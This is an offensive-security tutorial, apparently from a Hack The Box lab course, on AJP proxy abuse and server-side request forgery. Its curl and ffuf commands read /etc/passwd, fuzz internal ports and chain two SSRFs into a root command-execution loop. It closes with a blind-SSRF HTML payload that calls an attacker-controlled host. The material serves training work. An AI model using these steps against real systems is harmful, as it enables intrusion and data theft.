# Server-side Attacks

## Introduction to Server-Side Attacks

Server-Side Attacks leverage the below in an attempt to issue requests on behalf of the hosting application server, leak sensitive data, or have the hosting application server execute attacker-supplied commands:

* The trust between the final application server and intermediate machines/components or itself
* User input-handling inefficiencies, such as differences regarding interpretation or poor validation

### Types of Server-side Attacks

* **Abusing Intermediary Applications:** Accessing internal applications not accessible from our network by leveraging specific exposed binary protocols.

* **Server-Side Request Forgery (SSRF):** Making the hosting application server issue requests to arbitrary external domains or internal resources in an attempt to identify sensitive data.

* **Server-Side Includes Injection (SSI):** Injecting a payload so that ill-intended Server-Side Include directives are parsed to achieve remote code execution or leak sensitive data. This vulnerability occurs when poorly validated user input manages to become part of a response that is parsed for Server-Side Include directives.

* **Edge-Side Includes Injection:** Edge Side Includes (ESI) is an XML-based markup language used to tackle performance issues by temporarily storing dynamic web content that the regular web caching protocols do not save. Edge-Side Include Injection occurs when an attacker manages to reflect ill-intended ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin. They will gladly parse and evaluate legitimate ESI tags by the upstream server and malicious ESI tags supplied by an attacker.

* **Server-Side Template Injection (SSTI):** Template Engines facilitate dynamic data presentation through web pages or emails. Server-Side Template Injection is essentially injecting ill-intended template directives (payload) inside a template, leveraging Template Engines that insecurely mix user input with a given template.

* **Extensible Stylesheet Language Transformations Server-Side Injection:** Extensible Stylesheet Language Transformations (XSLT) is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF. Extensible Stylesheet Language Transformations Server-Side Injection can occur when arbitrary XSLT file upload is possible or when an application generates the XSL Transformation’s XML document dynamically using unvalidated input from the user.

# Abusing Intermediary Applications

## AJP Proxy

According to Apache, [AJP](https://cwiki.apache.org/confluence/display/TOMCAT/Connectors) (or JK) is a wire protocol. It is an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat. Historically, Apache has been much faster than Tomcat at serving static content. The idea is to let Apache serve the static content when possible but proxy the request to Tomcat for Tomcat-related content.

When we come across open AJP proxy ports (`8009 TCP`) during penetration tests, we may be able to use them to access the "hidden" Apache Tomcat Manager behind it. Although AJP-Proxy is a binary protocol, we can configure our own Nginx or Apache webserver with AJP modules to interact with it and access the underlying application. This way, we can discover administrative panels, applications, and websites that would be otherwise inaccessible.

To see how we can configure our own Nginx or Apache webserver with AJP modules to interact with an open AJP proxy and access the underlying application, jump to the next interactive section.

Note: If you want to replicate such a vulnerable environment on a local machine, you can start an Apache Tomcat Docker exposing only the AJP-Proxy as follows:

First, create a file called `tomcat-users.xml` including the below:
```xml
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <user username="tomcat" password="s3cret" roles="manager-gui,manager-script"/>
</tomcat-users>
```
After this file is created, install the docker package in your local machine and start the Apache Tomcat Server by issuing the commands below:
```
user@htb[/htb]$ sudo apt install docker
user@htb[/htb]$ sudo docker run -it --rm -p 8009:8009 -v `pwd`/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml --name tomcat "tomcat:8.0"
```

## Nginx Reverse Proxy & AJP

When we come across an open AJP proxy port (8009 TCP), we can use Nginx with the `ajp_module` to access the "hidden" Tomcat Manager. This can be done by compiling the Nginx source code and adding the required module, as follows:
* Download the Nginx source code
* Download the required module
* Compile Nginx source code with the `ajp_module`.
* Create a configuration file pointing to the AJP Port

**Download Nginx Source Code**
```
user@htb[/htb]$ wget https://nginx.org/download/nginx-1.21.3.tar.gz
user@htb[/htb]$ tar -xzvf nginx-1.21.3.tar.gz
```

**Compile Nginx source code with the ajp module**

```
user@htb[/htb]$ git clone https://github.com/dvershinin/nginx_ajp_module.git
user@htb[/htb]$ cd nginx-1.21.3
user@htb[/htb]$ sudo apt install libpcre3-dev
user@htb[/htb]$ ./configure --add-module=../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
user@htb[/htb]$ make
user@htb[/htb]$ sudo make install
user@htb[/htb]$ nginx -V

nginx version: nginx/1.21.3
built by gcc 10.2.1 20210110 (Debian 10.2.1-6)
configure arguments: --add-module=../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
```

Comment out the entire `server` block and append the following lines inside the `http` block in `/etc/nginx/conf/nginx.conf`.

**Pointing to the AJP Port**
```
upstream tomcats {
	server <TARGET_SERVER>:8009;
	keepalive 10;
	}
server {
	listen 80;
	location / {
		ajp_keep_conn on;
		ajp_pass tomcats;
	}
}
```
Start Nginx and check if everything is working correctly by issuing a cURL request to your local host.
```
user@htb[/htb]$ sudo nginx
user@htb[/htb]$ curl http://127.0.0.1:80

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Apache Tomcat/X.X.XX</title>
        <link href="favicon.ico" rel="icon" type="image/x-icon" />
        <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
        <link href="tomcat.css" rel="stylesheet" type="text/css" />
    </head>

    <body>
        <div id="wrapper">
            <div id="navigation" class="curved container">
                <span id="nav-home"><a href="https://tomcat.apache.org/">Home</a></span>
                <span id="nav-hosts"><a href="/docs/">Documentation</a></span>
                <span id="nav-config"><a href="/docs/config/">Configuration</a></span>
                <span id="nav-examples"><a href="/examples/">Examples</a></span>
                <span id="nav-wiki"><a href="https://wiki.apache.org/tomcat/FrontPage">Wiki</a></span>
                <span id="nav-lists"><a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></span>
                <span id="nav-help"><a href="https://tomcat.apache.org/findhelp.html">Find Help</a></span>
                <br class="separator" />
            </div>
            <div id="asf-box">
                <h1>Apache Tomcat/X.X.XX</h1>
            </div>
            <div id="upper" class="curved container">
                <div id="congrats" class="curved container">
                    <h2>If you're seeing this, you've successfully installed Tomcat. Congratulations!</h2>
<SNIP>
```
Note: Be sure the port 80 is not already in use (as occurs in the Pwnbox). In this case, in the above configuration change port 80 to 8080. Finally, use port 8080 with cURL.

## Apache Reverse Proxy & AJP

Luckily, Apache has the AJP module precompiled for us. We will need to install it, though, as it doesn't come in default installations. Configuring the AJP-Proxy in our Apache server can be done as follows:
* Install the libapache2-mod-jk package
* Enable the module
* Create the configuration file pointing to the target AJP-Proxy port

Note: As mentioned in the previous section, port `80` is in use in Pwnbox, and Apache also uses it as its default port. You can change Apache's default port on `/etc/apache2/ports.conf` to any other port. If you are using nginx running on port `8080` and if you use port `8080` for this purpose, don't forget to stop nginx beforehand with `sudo nginx -s stop.`

The required commands and configuration files are the following:
```
user@htb[/htb]$ sudo apt install libapache2-mod-jk
user@htb[/htb]$ sudo a2enmod proxy_ajp
user@htb[/htb]$ sudo a2enmod proxy_http
user@htb[/htb]$ export TARGET="<TARGET_IP>"
user@htb[/htb]$ echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
user@htb[/htb]$ sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
user@htb[/htb]$ sudo systemctl start apache2
```
Note: of course, if the target server does not use the default port `8009` as AJP port, we must change the port number on the commands above with the correct port number.

For accessing the "hidden" Tomcat page:
```
user@htb[/htb]$ curl http://127.0.0.1:8080
<SNIP>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Apache Tomcat/X.X.XX</title>
        <link href="favicon.ico" rel="icon" type="image/x-icon" />
        <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
        <link href="tomcat.css" rel="stylesheet" type="text/css" />
    </head>

    <body>
        <div id="wrapper">
            <div id="navigation" class="curved container">
                <span id="nav-home"><a href="https://tomcat.apache.org/">Home</a></span>
                <span id="nav-hosts"><a href="/docs/">Documentation</a></span>
                <span id="nav-config"><a href="/docs/config/">Configuration</a></span>
                <span id="nav-examples"><a href="/examples/">Examples</a></span>
                <span id="nav-wiki"><a href="https://wiki.apache.org/tomcat/FrontPage">Wiki</a></span>
                <span id="nav-lists"><a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></span>
                <span id="nav-help"><a href="https://tomcat.apache.org/findhelp.html">Find Help</a></span>
                <br class="separator" />
            </div>
            <div id="asf-box">
                <h1>Apache Tomcat/X.X.XX</h1>
            </div>
            <div id="upper" class="curved container">
                <div id="congrats" class="curved container">
                    <h2>If you're seeing this, you've successfully installed Tomcat. Congratulations!</h2>
                </div>
<SNIP>
```
If we configure everything correctly, we will be able to access the Apache Tomcat manager using both cURL and our web browser.

# Server-Side Request Forgery (SSRF)

## Server-Side Request Forgery (SSRF) Overview

Server-Side Request Forgery (`SSRF`) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. To do that, we usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:
* Interacting with known internal systems
* Discovering internal services via port scans
* Disclosing local/sensitive data
* Including files in the target application
* Leaking NetNTLM hashes using UNC Paths (Windows)
* Achieving remote code execution

We can usually find SSRF vulnerabilities in applications that fetch remote resources. When hunting for SSRF vulnerabilities, we should look for:
* Parts of HTTP requests, including URLs
* File imports such as HTML, PDFs, images, etc.
* Remote server connections to fetch data
* API specification imports
* Dashboards including ping and similar functionalities to check server statuses

Note: Always keep in mind that web application fuzzing should be part of any penetration testing or bug bounty hunting activity. That being said, fuzzing should not be limited to user input fields only. Extend fuzzing to parts of the HTTP request as well, such as the User-Agent.

## SSRF Exploitation Example

This example is executed on Academy Hack The Box target machine. Let's first exploit an internet-facing web application and then work to gain remote code execution on an internal host by chaining multiple SSRF vulnerabilities. The attack flow will be as follows:

`[PENTESTER]	🠖	[EXERCISE-TARGET]--[SSRF]	🠖	[INTERNAL-WEBSERVER]--[SSRF]	🠖	[LOCALHOST WEBAPP]	🠖	[RCE]`

Basic reconnaissance against the host shows there are only two open ports:
```
user@htb[/htb]$ nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>

Nmap scan report for <TARGET IP>
Host is up (0.00047s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
```
Let's issue a cURL request to the target server using the parameters `-i` to show the protocol response headers and `-s` to use the silent mode.
```
user@htb[/htb]$ curl -i -s http://<TARGET IP>

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python
Date: Mon, 18 Oct 2021 09:01:02 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link.
```
We can see the request redirected to `/load?q=index.html`, meaning the `q` parameter fetches the resource `index.html`. Let us follow the redirect to see if we can gather any additional information by adding the `-L` parameter.

```
user@htb[/htb]$ curl -i -s -L http://<TARGET IP>

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 153
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

<html>
<!-- ubuntu-web.lalaguna.local & internal.app.local load resources via q parameter -->
<body>
<h1>Bad App</h1>
<a>Hello World!</a>
</body>
</html>
```

The spawned target is `ubuntu-web.lalaguna.local`, and `internal.app.local` is an application on the internal network (inaccessible from our current position).

The next step is to confirm if the `q` parameter is vulnerable to SSRF. If it is, we may be able to reach the internal.app.local web application by leveraging the SSRF vulnerability. We say "may" because a trust relationship likely exists for `ubuntu-web` to be able to reach and interact with `internal.app.local`. This type of relationship can be something as simple as a firewall rule (or even a lack of any firewall rule).

In one terminal, let's use Netcat to listen on port 8080, as follows:
```
user@htb[/htb]$ nc -nvlp 8080

listening on [any] 8080 ...
```

Now, with the purpose of testing for SSRF, let us issue a request to the target web application with `http://<VPN/TUN Adapter IP>` instead of `index.html` in another terminal, as follows. `<VPN/TUN Adapter IP>` will either be the TUN adapter IP of Pwnbox or the TUN adapter IP of the local VM you may be using (after connecting with the supplied VPN key):
```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 0
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 12:07:10 GMT
```

We will receive the following into our Netcat listener confirming the SSRF vulnerability via a request issued by the target server using [Python-urllib](https://docs.python.org/3.8/library/urllib.html):
```
Connection received on <TARGET IP> 49852
GET / HTTP/1.1
Accept-Encoding: identity
Host: <VPN/TUN Adapter IP>:8080
User-Agent: Python-urllib/3.8
Connection: close
```

Reading the [Python-urllib](https://docs.python.org/3.8/library/urllib.html) documentation, we can see it supports `file`, `http` and `ftp` schemas. So, apart from issuing HTTP requests to other services on behalf of the target application, we can also read local files via the `file` schema and remote files using `ftp`.

We can test this functionality through the steps below:

1. Create a file called `index.html`:
```html
<html>
</body>
<a>SSRF</a>
<body>
<html>
```

2. Inside the directory where `index.html` is located, start an HTTP server using the following command:

**Start Python HTTP Server**
```
user@htb[/htb]$ python3 -m http.server 9090
```

3. Inside the directory where `index.html` is located, start an FTP Server via the following command

**Start FTP Server**
```
user@htb[/htb]$ sudo pip3 install twisted
user@htb[/htb]$ sudo python3 -m twisted ftp -p 21 -r .
```

4. Retrieve `index.html` through the target application using the ftp schema, as follows:

**Retrieving a remote file through the target application - FTP Schema**
```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 41
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:21:09 GMT

<html>
</body>
<a>SSRF</a>
<body>
<html>
```

5. Retrieve `index.html` through the target application using the `http` schema, as follows:

**Retrieving a remote file through the target application - HTTP Schema**
```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 41
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:26:18 GMT

<html>
</body>
<a>SSRF</a>
<body>
<html>
```

6. Retrieve a local file using the file schema, as follows:

**Retrieving a local file through the target application - File Schema**
```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" 

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 926
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:27:17 GMT

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Bear in mind that fetching remote HTML files can lead to Reflected XSS.

Remember, we only have two open ports on the target server. However, there is a possibility of internal applications existing and listening only on localhost. We can use a tool such as ffuf to enumerate these web applications by performing the following steps:

1. Generate a wordlist containing all possible ports.

**Generate a Wordlist**
```
user@htb[/htb]$ for port in {1..65535};do echo $port >> ports.txt;done
```

2. Issue a cURL request to a random port to get the response size of a request for a non-existent service.

**Curl - Interacting with the Target**
```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 30
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:36:25 GMT

[Errno 111] Connection refused
```

3. Use `ffuf` with the wordlist and discard the responses which have the size we previously identified.

**Port Fuzzing**
```
user@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>/load?q=http://127.0.0.1:PORT
 :: Wordlist         : PORT: ./ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 30
________________________________________________

80                      [Status: 200, Size: 153, Words: 11, Lines: 8]
5000                    [Status: 200, Size: 64, Words: 3, Lines: 1]
:: Progress: [65535/65535] :: Job [1/1] :: 577 req/sec :: Duration: [0:02:00] :: Errors: 0 ::
```
We have received a valid response for port `5000`. Let us check it as follows.

**cURL - Interacting with the Target**
```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 64
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:47:16 GMT

<html><body><h1>Hey!</h1><a>Some internal app!</a></body></html>
```

Up to this point, we have learned how to reach internal applications and use different schemas to load local files through SSRF. Armed with this knowledge, let us try attacking the `internal.app.local` web application, again through SSRF. Our ultimate goal is to achieve remote code execution on an internal host.

First, we issue a simple cURL request to the internal application we discovered previously. Remember the information we uncovered that both applications load resources in the same way (via the `q` parameter).

**cURL - Interacting with the Target**
```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 83
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 13:51:15 GMT

<html>
<body>
<h1>Internal Web Application</h1>
<a>Hello World!</a>
</body>
</html>
```
Now, let us discover any web applications listening in localhost. Let us try to issue a request to a random port to identify how responses from closed ports look.

**cURL - Interacting with the Target**
```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 97
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:52:32 GMT

<html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html>
```
We have received an `unknown url type` error message. It seems the web application is removing `://` from our request. Let's try to overcome this situation by modifying the URL.

**cURL - Interacting with the Target**
```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 99
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:55:10 GMT

<html><body><h1>Resource: http://127.0.0.1:1</h1><a>[Errno 111] Connection refused</a></body></html>
```
In this case, the web application returns some HTML rendered content containing the resource we are trying to fetch. This response will affect our internal service discovery if we use the size of the response as a filter as it will change depending on the port and we can get different size on the response text. Fortunately for us, ffuf supports regular expressions for filtering. We can use this ffuf feature to use the error number for filtering responses, as follows:

**Port Fuzzing**
```
user@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT
 :: Wordlist         : PORT: ./ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: Errno[[:blank:]]111
________________________________________________

80                      [Status: 200, Size: 153, Words: 5, Lines: 6]
5000                    [Status: 200, Size: 123, Words: 3, Lines: 5]
:: Progress: [65535/65535] :: Job [1/1] :: 249 req/sec :: Duration: [0:04:06] :: Errors: 0 ::
```
We have found another application listening on port `5000`. In this case, the application responds with a list of files:

**cURL - Interacting with the Target**
```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 385
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 20:30:07 GMT

<html><body><h1>Resource: http://127.0.0.1:5000/</h1><a>total 24K
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..
-rw-r--r-- 1 root root   84 Oct 19 16:32 index.html
-rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py
-rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py
-rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh
 </a></body></html>
 ```

Let us make a quick recap of what we have achieved:
* Issue requests on behalf of ubuntu-web to internal.app.local
* Reach a web application listening on port 5000 inside internal.app.local chaining two SSRF vulnerabilities
* Disclose a list of files via the internal application

Let us now uncover the source code of the web applications listening on `internal.app.local` to see how we can achieve remote code execution.

Let us issue a request to disclose `/proc/self/environ` file, where the current path should be present under the `PWD` environment variable:

**cURL - Interacting with the Target**

```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 584
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 16:52:20 GMT

<html><body><h1>Resource: file:///proc/self/environ</h1><a>HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=57.5.0HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/local/bin/python3</a></body></html>
```
Now we know that the current path is `/app`, and we have a list of interesting files. Let's disclose the `internal_local.py` file as follows:

**Retrieving a local file through the target application - File Schema**

```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 771
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 20:40:28 GMT

<html><body><h1>Resource: file:///app/internal_local.py</h1><a>import os
from flask import *
import urllib
import subprocess

basedir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)

def run_command(command):
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = p.stdout.read()
    stderr = p.stderr.read()
    result = stdout.decode() + " " + stderr.decode()
    return result

@app.route("/")
def index():
    return run_command("ls -lha")

@app.route("/runme")
def runmewithargs():
    command = request.args.get("x")
    if command == "":
        return "Use /runme?x=<CMD>"
    return run_command(command)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
</a></body></html>
```
By studying the source code above, we notice a functionality that allows us to execute commands on the remote host sending a GET request to `/runme?x=<CMD>`. Let us confirm remote code execution by sending `whoami` as a command:

**cURL - Interacting with the Target**

```
user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 93
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 20:48:32 GMT

<html><body><h1>Resource: http://127.0.0.1:5000/runme?x=whoami</h1><a>root
 </a></body></html>
 ```

 We can execute commands under the superuser context on the target application. But what happens if we try to submit a command with arguments, such as the below?
 ```
 user@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"

HTTP/1.0 400 Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1')
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 586

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 400</p>
        <p>Message: Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1').</p>
        <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
    </body>
</html>
```
To execute commands with arguments or special characters, we need to encode them three times as we pass them through three different web applications.

For doing so, you can use any online URL-encoding service such as [urlencoder.org](https://www.urlencoder.org/). A quick way to achieve this from the terminal also exists. This is to use `jq`, which supports encoding as follows:

**Install JQ**
```
user@htb[/htb]$ sudo apt-get install jq
user@htb[/htb]$ echo "encode me" | jq -sRr @uri
encode%20me%0A
```
We can now create a bash function to automate executing commands on the target application.

**Automate executing commands**
```
user@htb[/htb]$ function rce() {
function> while true; do
function while> echo -n "# "; read cmd
function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
function while> curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
function while> echo ""
function while> done
function> }
```
Tip: `-n` option from echo must be used if we need to use `jq` URL encoding more than one time.

Now we need to call the function and execute commands via:
```
user@htb[/htb]$ rce
# uname -a; hostname; whoami

<html><body><h1>Resource: http://127.0.0.1:5000/runme?x=uname%20-a%3B%20hostname%3B%20whoami
</h1><a>Linux a054d48cc0a4 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64 GNU/Linux
a054d48cc0a4
root
 </a></body></html>
```
Note: in the exercise of the lab, if I don't use the bash function `rce()` with the URL encoding, I don't get any error, but when I type `ls` command, it returns always the current directory. If I use URL encoding by the `rce()` function, `ls` works properly.

## Blind SSRF

Server-Side Request Forgery vulnerabilities can be "blind." In these cases, even though the request is processed, we can't see the backend server's response. For this reason, blind SSRF vulnerabilities are more difficult to detect and exploit.

We can detect blind SSRF vulnerabilities via out-of-band techniques, making the server issue a request to an external service under our control. To detect if a backend service is processing our requests, we can either use a server with a public IP address that we own or services such as:
* [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) (Part of Burp Suite professional. Not Available in the community edition)
* http://pingb.in

Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.

## Blind SSRF Exploitation Example

Now, let us exploit a blind SSRF vulnerability in a web application that receives an HTML file and returns a PDF document. This web application is the target we can spawn on the exercise at the end of this section. For the exercise on Academy HTB, the port is listening on port `8080`.

If we upload various HTML files and inspect the responses, we will notice that the application returns the same response regardless of the structure and content of the submitted files. In addition, we cannot observe any response related to the processing of the submitted HTML file on the front end. Should we conclude that the application is not vulnerable to SSRF? Of course not! We should be thorough during penetration tests and look for the blind counterparts of different vulnerability classes.

Let us create an HTML file containing a link to a service under our control to test if the application is vulnerable to a blind SSRF vulnerability. This service can be a web server hosted in a machine we own, Burp Collaborator, a Pingb.in URL etc. Please note that the protocols we can use when utilizing out-of-band techniques include HTTP, DNS, FTP, etc.
```html
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
</body>
</html>
```
